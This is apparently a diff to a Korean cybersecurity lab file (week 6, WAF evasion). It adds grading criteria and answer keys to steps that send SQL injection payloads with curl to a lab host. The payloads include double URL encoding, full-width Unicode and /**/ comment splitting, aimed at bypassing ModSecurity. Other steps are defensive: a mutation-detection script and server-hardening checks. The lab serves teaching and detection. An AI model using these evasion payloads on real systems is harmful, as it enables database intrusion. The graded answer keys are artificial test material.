@@ -3,8 +3,7 @@ title: 회피·다형성 — 변형 진화 탐지 (AI 지원)
 version: ai
 course: agent-ir-ai
 week: 6
-description: 같은 의미·다른 표면의 페이로드를 연속 투입해 WAF 반응을 비교하고, 변형 진화 탐지 로직을 구현한다. AI SubAgent가
-  자동으로 명령을 실행·검증합니다.
+description: 같은 의미·다른 표면의 페이로드를 연속 투입해 WAF 반응을 비교하고, 변형 진화 탐지 로직을 구현한다. AI SubAgent가 자동으로 명령을 실행·검증합니다.
 difficulty: hard
 duration_minutes: 150
 objectives:
@@ -27,6 +26,19 @@ steps:
     type: output_contains
     expect: code=
     field: stdout
+    semantic:
+      intent: 원본 SQLi WAF 기준선 — curl /vulnerabilities/sqli/?id=1 OR 1=1-- (URL 인코딩 X) 로 기본 페이로드 전송 + ModSec
+        403 확인. w4 s4 와 유사하지만 w6 는 변형 진화 비교 기준점
+      success_criteria:
+      - 원본 SQLi 페이로드
+      - WAF 반응 기준선
+      - 후속 변형 기준점
+      acceptable_methods:
+      - curl 원본
+      - Burp Repeater baseline
+      negative_signs:
+      - 변형 적용
+      - 반응 확인 없음
   target_vm: web
   script: 'curl -s -o /dev/null -w ''code=%{http_code}\n'' -X POST http://10.20.30.80:8082/rest/user/login
     -H ''Content-Type: application/json'' -d ''{"email":"admin\" OR 1=1--","password":"x"}'''
@@ -45,6 +57,17 @@ steps:
     type: output_contains
     expect: code=
     field: stdout
+    semantic:
+      intent: URL 이중 인코딩 — %2527 로 싱글쿼터 변형 → s1 대비 WAF 반응 비교. 정규식 디코딩 한계 테스트
+      success_criteria:
+      - 이중 인코딩 페이로드
+      - s1 과 응답 비교
+      acceptable_methods:
+      - curl 이중 인코딩
+      - sqlmap --tamper=charencode
+      negative_signs:
+      - 단일 인코딩만
+      - 비교 없음
   target_vm: web
   script: curl -s -o /dev/null -w 'code=%{http_code}\n' 'http://10.20.30.80:8082/rest/user/login?email=admin%2527%2520OR%25201%253D1--&password=x'
   risk_level: low
@@ -62,6 +85,18 @@ steps:
     type: output_contains
     expect: code=
     field: stdout
+    semantic:
+      intent: Unicode full-width 변형 — Ｏ Ｒ (U+FF2F U+FF12) full-width 문자로 OR 대체 → ModSec ASCII 정규식 우회.
+        i18n 정규화 부재 악용
+      success_criteria:
+      - Unicode full-width 페이로드
+      - U+FF 대역 사용
+      acceptable_methods:
+      - python unicode + curl
+      - xxd 로 바이트 확인
+      negative_signs:
+      - ASCII 만
+      - full-width 개념 없음
   target_vm: web
   script: curl -s -o /dev/null -w 'code=%{http_code}\n' 'http://10.20.30.80:8082/rest/user/login?email=admin＇ＯＲ１＝１--&password=x'
   risk_level: low
@@ -81,6 +116,18 @@ steps:
     - code=
     - 주석
     field: stdout
+    semantic:
+      intent: 주석 공백 분할 — OR/**/1=1 또는 UN/**/ION SEL/**/ECT 로 SQL 주석 /**/ 을 공백 대체. 일부 DB (MySQL) 는 주석을
+        토큰 분리자로 처리하지만 ModSec 정규식은 공백 기대. content 매칭 우회
+      success_criteria:
+      - /**/ 주석 분할 페이로드
+      - 공백 대체 원리
+      acceptable_methods:
+      - curl + /**/
+      - sqlmap --tamper=space2comment
+      negative_signs:
+      - 주석 없음
+      - 공백 대체 개념 없음
   target_vm: web
   script: curl -s -o /dev/null -w 'code=%{http_code}\n' 'http://10.20.30.80:8082/rest/user/login?email=admin%27/**/OR/**/1=1--&password=x'
   risk_level: low
@@ -92,18 +139,29 @@ steps:
   points: 13
   answer: '🤖 프롬프트: 타이밍 변형 — 1초 간격으로 같은 페이로드 반복.
 
-    📎 참고 (CLI): for i in 1 2 3; do curl -s -o /dev/null -w ''try=''$i'' code=%{http_code}\n''
-    http://10.20.30.80:8082/rest/user/login -d ''{"email":"a"}'' -H ''Content-Type:
-    application/json''; sleep 1; done'
+    📎 참고 (CLI): for i in 1 2 3; do curl -s -o /dev/null -w ''try=''$i'' code=%{http_code}\n'' http://10.20.30.80:8082/rest/user/login
+    -d ''{"email":"a"}'' -H ''Content-Type: application/json''; sleep 1; done'
   answer_detail: 타이밍 축 변형. 속도만으로는 회피 약함.
   verify:
     type: output_contains
     expect: try=
     field: stdout
+    semantic:
+      intent: 타이밍 변형 — for i in 1..5; do curl SQLi; sleep 1; done 1초 간격 5회 반복. threshold 기반 탐지 우회. rate
+        limit 회피
+      success_criteria:
+      - 1초 간격 반복
+      - 5회 이상 시도
+      - timing 우회 개념
+      acceptable_methods:
+      - for + sleep + curl
+      - python + time.sleep
+      negative_signs:
+      - sleep 없음
+      - 반복 1회만
   target_vm: web
-  script: 'for i in 1 2 3; do curl -s -o /dev/null -w ''try=''$i'' code=%{http_code}\n''
-    http://10.20.30.80:8082/rest/user/login -d ''{"email":"a"}'' -H ''Content-Type:
-    application/json''; sleep 1; done'
+  script: 'for i in 1 2 3; do curl -s -o /dev/null -w ''try=''$i'' code=%{http_code}\n'' http://10.20.30.80:8082/rest/user/login
+    -d ''{"email":"a"}'' -H ''Content-Type: application/json''; sleep 1; done'
   risk_level: low
   bastion_prompt: 타이밍 변형 — 1초 간격으로 같은 페이로드 반복.
 - order: 6
@@ -113,16 +171,29 @@ steps:
   points: 14
   answer: '🤖 프롬프트: ModSec 감사 로그에서 룰 매칭 분포 재조사.
 
-    📎 참고 (CLI): sudo tail -100 /var/log/bunkerweb/modsec_audit.log 2>/dev/null | grep
-    -oE ''id "[0-9]+"'' | sort | uniq -c | sort -rn | head || echo ''no_modsec_events'''
+    📎 참고 (CLI): sudo tail -100 /var/log/bunkerweb/modsec_audit.log 2>/dev/null | grep -oE ''id "[0-9]+"''
+    | sort | uniq -c | sort -rn | head || echo ''no_modsec_events'''
   answer_detail: 어떤 변형이 어느 룰에 걸렸는지 분포. *CRS 942xxx*가 SQLi 카테고리.
   verify:
     type: output_contains
     expect: ''
     field: stdout
+    semantic:
+      intent: ModSec 룰 매칭 분포 재조사 — w4 s6 와 유사하지만 w6 변형 공격 후 재측정. 변형이 감지율에 어떤 영향 미쳤는지 before/after 비교.
+        evasion 효과 정량화
+      success_criteria:
+      - 변형 공격 후 ModSec 로그
+      - 전주 대비 변화
+      - evasion 효과 측정
+      acceptable_methods:
+      - awk + sort uniq -c
+      - python diff
+      negative_signs:
+      - 단발 측정
+      - before/after 비교 없음
   target_vm: web
-  script: sudo tail -100 /var/log/bunkerweb/modsec_audit.log 2>/dev/null | grep -oE
-    'id "[0-9]+"' | sort | uniq -c | sort -rn | head || echo 'no_modsec_events'
+  script: sudo tail -100 /var/log/bunkerweb/modsec_audit.log 2>/dev/null | grep -oE 'id "[0-9]+"' | sort
+    | uniq -c | sort -rn | head || echo 'no_modsec_events'
   risk_level: low
   bastion_prompt: ModSec 감사 로그에서 룰 매칭 분포 재조사.
 - order: 7
@@ -130,26 +201,38 @@ steps:
   hint: target_vm=bastion에서 수행. 아래 CLI 예시 참고.
   category: analysis
   points: 15
-  answer: "\U0001F916 프롬프트: 페이로드 변형 진화 탐지 함수 작성.\n\U0001F4CE 참고 (CLI): cat > ~/ccc/scripts/evolve.py\
-    \ <<'PY'\nfrom difflib import SequenceMatcher\ndef evolving(bodies):\n    diffs\
-    \ = [1-SequenceMatcher(None,a,b).ratio() for a,b in zip(bodies, bodies[1:])]\n\
-    \    count = sum(1 for d in diffs if 0.05 < d < 0.4)\n    return count >= 5, diffs\n\
-    bodies=[\"admin OR 1=1\",\"admin' OR 1=1--\",\"admin'/**/OR/**/1=1\",\"admin'+OR+1=1\"\
-    ,\"admin%27%20OR%201=1\",\"admin' UNION SELECT 1\"]\nok, diffs = evolving(bodies)\n\
-    print('evolving', ok, 'diffs', [round(d,2) for d in diffs])\nPY\npython3 ~/ccc/scripts/evolve.py"
+  answer: "\U0001F916 프롬프트: 페이로드 변형 진화 탐지 함수 작성.\n\U0001F4CE 참고 (CLI): cat > ~/ccc/scripts/evolve.py <<'PY'\n\
+    from difflib import SequenceMatcher\ndef evolving(bodies):\n    diffs = [1-SequenceMatcher(None,a,b).ratio()\
+    \ for a,b in zip(bodies, bodies[1:])]\n    count = sum(1 for d in diffs if 0.05 < d < 0.4)\n    return\
+    \ count >= 5, diffs\nbodies=[\"admin OR 1=1\",\"admin' OR 1=1--\",\"admin'/**/OR/**/1=1\",\"admin'+OR+1=1\"\
+    ,\"admin%27%20OR%201=1\",\"admin' UNION SELECT 1\"]\nok, diffs = evolving(bodies)\nprint('evolving',\
+    \ ok, 'diffs', [round(d,2) for d in diffs])\nPY\npython3 ~/ccc/scripts/evolve.py"
   answer_detail: 부분 변형 탐지. 0.05~0.4는 '점진적' 변화. 5회+면 에이전트 회피 시도 의심.
   verify:
     type: output_contains
     expect: evolving
     field: stdout
+    semantic:
+      intent: '페이로드 변형 진화 탐지 — python3 함수 def detect_mutation(requests): 같은 IP 의 연속 페이로드 string similarity
+        (difflib.SequenceMatcher) < 0.7 AND 같은 엔드포인트 → mutation 탐지. agent iterative evolution signature'
+      success_criteria:
+      - 변형 진화 탐지 함수
+      - similarity 기반 감지
+      - iterative mutation 개념
+      acceptable_methods:
+      - python difflib
+      - fuzzywuzzy + Ratio
+      - Levenshtein distance
+      negative_signs:
+      - similarity 없음
+      - 단일 요청 분석
   target_vm: bastion
-  script: "cat > ~/ccc/scripts/evolve.py <<'PY'\nfrom difflib import SequenceMatcher\n\
-    def evolving(bodies):\n    diffs = [1-SequenceMatcher(None,a,b).ratio() for a,b\
-    \ in zip(bodies, bodies[1:])]\n    count = sum(1 for d in diffs if 0.05 < d <\
-    \ 0.4)\n    return count >= 5, diffs\nbodies=[\"admin OR 1=1\",\"admin' OR 1=1--\"\
-    ,\"admin'/**/OR/**/1=1\",\"admin'+OR+1=1\",\"admin%27%20OR%201=1\",\"admin' UNION\
-    \ SELECT 1\"]\nok, diffs = evolving(bodies)\nprint('evolving', ok, 'diffs', [round(d,2)\
-    \ for d in diffs])\nPY\npython3 ~/ccc/scripts/evolve.py"
+  script: "cat > ~/ccc/scripts/evolve.py <<'PY'\nfrom difflib import SequenceMatcher\ndef evolving(bodies):\n\
+    \    diffs = [1-SequenceMatcher(None,a,b).ratio() for a,b in zip(bodies, bodies[1:])]\n    count =\
+    \ sum(1 for d in diffs if 0.05 < d < 0.4)\n    return count >= 5, diffs\nbodies=[\"admin OR 1=1\"\
+    ,\"admin' OR 1=1--\",\"admin'/**/OR/**/1=1\",\"admin'+OR+1=1\",\"admin%27%20OR%201=1\",\"admin' UNION\
+    \ SELECT 1\"]\nok, diffs = evolving(bodies)\nprint('evolving', ok, 'diffs', [round(d,2) for d in diffs])\n\
+    PY\npython3 ~/ccc/scripts/evolve.py"
   risk_level: low
   bastion_prompt: 페이로드 변형 진화 탐지 함수 작성.
 - order: 8
@@ -159,16 +242,27 @@ steps:
   points: 16
   answer: '🤖 프롬프트: 단서 최소화 #1 — Apache ServerTokens Prod 설정 여부 확인.
 
-    📎 참고 (CLI): sudo grep -i ServerTokens /etc/apache2/conf-enabled/security.conf
-    2>/dev/null || echo ''default_Full'''
+    📎 참고 (CLI): sudo grep -i ServerTokens /etc/apache2/conf-enabled/security.conf 2>/dev/null || echo
+    ''default_Full'''
   answer_detail: 기본은 Full(버전 노출). Prod로 바꿔야 단서 최소화.
   verify:
     type: output_contains
     expect: ''
     field: stdout
+    semantic:
+      intent: Apache ServerTokens Prod — grep ^ServerTokens /etc/apache2/apache2.conf 또는 conf.d/security.conf.
+        Prod 설정 시 Server 헤더에 Apache 만 표시 (버전·OS 숨김). 정보 최소화 1순위
+      success_criteria:
+      - ServerTokens 설정 확인
+      - Prod 값
+      acceptable_methods:
+      - grep + conf 확인
+      - curl -I + Server 헤더
+      negative_signs:
+      - 설정 없음
+      - Prod 아닌 값
   target_vm: web
-  script: sudo grep -i ServerTokens /etc/apache2/conf-enabled/security.conf 2>/dev/null
-    || echo 'default_Full'
+  script: sudo grep -i ServerTokens /etc/apache2/conf-enabled/security.conf 2>/dev/null || echo 'default_Full'
   risk_level: low
   bastion_prompt: '단서 최소화 #1 — Apache ServerTokens Prod 설정 여부 확인.'
 - order: 9
@@ -178,16 +272,26 @@ steps:
   points: 17
   answer: '🤖 프롬프트: 단서 최소화 #2 — 에러 페이지 커스텀 확인.
 
-    📎 참고 (CLI): ls -la /var/www/html/error.html 2>/dev/null && echo ''error_page_ok''
-    || echo ''no_custom_error'''
+    📎 참고 (CLI): ls -la /var/www/html/error.html 2>/dev/null && echo ''error_page_ok'' || echo ''no_custom_error'''
   answer_detail: w04에서 만든 error.html 재사용. 500/403/404를 같은 페이지로.
   verify:
     type: output_contains
     expect: error
     field: stdout
+    semantic:
+      intent: 커스텀 에러 페이지 확인 — curl /nonexistent 로 404 응답 HTML 검사 + ErrorDocument 지시어 확인. 기본 Apache 404
+        페이지는 버전·OS 노출. 커스텀 페이지로 information leak 최소화
+      success_criteria:
+      - 404 응답 HTML 확인
+      - 기본 vs 커스텀 페이지
+      acceptable_methods:
+      - curl /notfound
+      - grep ErrorDocument
+      negative_signs:
+      - 404 확인 없음
+      - 정보 노출 분석 없음
   target_vm: web
-  script: ls -la /var/www/html/error.html 2>/dev/null && echo 'error_page_ok' || echo
-    'no_custom_error'
+  script: ls -la /var/www/html/error.html 2>/dev/null && echo 'error_page_ok' || echo 'no_custom_error'
   risk_level: low
   bastion_prompt: '단서 최소화 #2 — 에러 페이지 커스텀 확인.'
 - order: 10
@@ -204,9 +308,21 @@ steps:
     type: output_contains
     expect: ''
     field: stdout
+    semantic:
+      intent: ModSec 응답 룰 ID 노출 — curl 공격 페이로드 → 응답 헤더에 X-ModSec-Rule 같은 룰 ID 노출 여부. SecRuleEngine On
+        + SecDebugLogLevel 낮게 설정 확인. 방어 정보 누수 점검
+      success_criteria:
+      - ModSec 응답 확인
+      - 룰 ID 노출 여부
+      acceptable_methods:
+      - curl -I + grep
+      - SecDebug 설정 확인
+      negative_signs:
+      - 응답 미분석
+      - 노출 개념 없음
   target_vm: web
-  script: curl -si http://10.20.30.80:8082/ 2>/dev/null | grep -Ei 'modsec|rule|apache|server:'
-    | head -5
+  script: curl -si http://10.20.30.80:8082/ 2>/dev/null | grep -Ei 'modsec|rule|apache|server:' | head
+    -5
   risk_level: low
   bastion_prompt: '단서 최소화 #3 — ModSec 응답에 룰 ID 노출 여부 확인.'
 - order: 11
@@ -248,6 +364,16 @@ steps:
     type: output_contains
     expect: 단서 최소화
     field: stdout
+    semantic:
+      intent: '단서 최소화 체크리스트 /tmp/clue_minimization.md — 5 항목: ServerTokens Prod·커스텀 Error Page·ModSec
+        룰 ID 숨김·HTML 주석 제거·JavaScript 주석 제거. 각 항목 적용 여부. information leak 방어 baseline'
+      success_criteria:
+      - /tmp/clue_minimization.md
+      - 5 항목 + 적용 여부
+      acceptable_methods:
+      - cat > md checklist
+      negative_signs:
+      - 항목 3 이하
   target_vm: bastion
   script: 'cat > ~/ccc/artifacts/w06/clue-min.md <<''MD''
 
@@ -285,8 +411,8 @@ steps:
   points: 20
   answer: '🤖 프롬프트: experience 저장.
 
-    📎 참고 (CLI): echo ''{"id":"w06-evasion","variants_tried":5,"waf_hit_rate":"TBD"}''
-    > ~/ccc/data/bastion/experience/w06-evasion.json && cat ~/ccc/data/bastion/experience/w06-evasion.json'
+    📎 참고 (CLI): echo ''{"id":"w06-evasion","variants_tried":5,"waf_hit_rate":"TBD"}'' > ~/ccc/data/bastion/experience/w06-evasion.json
+    && cat ~/ccc/data/bastion/experience/w06-evasion.json'
   answer_detail: 변형 시도 기록.
   verify:
     type: output_contains
@@ -294,6 +420,16 @@ steps:
     - variants
     - 저장
     field: stdout
+    semantic:
+      intent: w06 experience — artifacts/experience/w06-evasion.json 에 변형 공격 5종 + 탐지율 변화 + 최소화 조치 + 개선
+        방향 기록
+      success_criteria:
+      - experience JSON
+      - 변형·탐지율·조치 기록
+      acceptable_methods:
+      - python json
+      negative_signs:
+      - JSON 아님
   target_vm: bastion
   script: echo '{"id":"w06-evasion","variants_tried":5,"waf_hit_rate":"TBD"}' > ~/ccc/data/bastion/experience/w06-evasion.json
     && cat ~/ccc/data/bastion/experience/w06-evasion.json
